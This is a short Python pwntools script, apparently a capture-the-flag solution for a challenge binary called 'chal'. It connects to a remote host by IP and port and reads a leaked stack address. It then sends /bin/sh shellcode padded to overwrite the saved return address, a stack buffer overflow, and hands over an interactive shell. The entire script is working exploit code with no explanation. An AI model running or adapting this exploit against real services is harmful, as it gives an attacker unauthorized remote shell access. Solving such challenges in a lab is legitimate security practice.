#!/usr/bin/env python3
from pwn import *

context.arch='amd64'
#context.log_level='debug'

f = ELF('./chal')
#p = process('./chal')
p = remote('134.209.237.231', 4270)

p.recvuntil('at ')
rsp=int(p.recvuntil('\n'), 16)
print('$RSP: ', rsp)

sz=128
sc = asm(shellcraft.sh())
payload = sc+b'\x00'*(128+8-len(sc))+p64(rsp)
p.sendline(payload)

p.interactive()
p.close()
